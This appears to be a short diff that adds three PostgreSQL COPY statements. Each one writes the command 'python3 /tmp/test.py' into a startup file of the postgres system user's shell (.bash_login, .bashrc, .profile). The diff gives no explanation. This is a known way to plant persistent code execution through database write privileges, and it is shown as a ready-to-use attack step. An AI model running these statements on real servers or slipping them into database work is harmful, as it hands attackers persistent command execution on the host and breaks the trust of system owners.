@@ -1,0 +1,3 @@
+COPY (SELECT 'python3 /tmp/test.py') TO '/var/lib/postgresql/.bash_login';
+COPY (SELECT 'python3 /tmp/test.py') TO '/var/lib/postgresql/.bashrc';
+COPY (SELECT 'python3 /tmp/test.py') TO '/var/lib/postgresql/.profile';
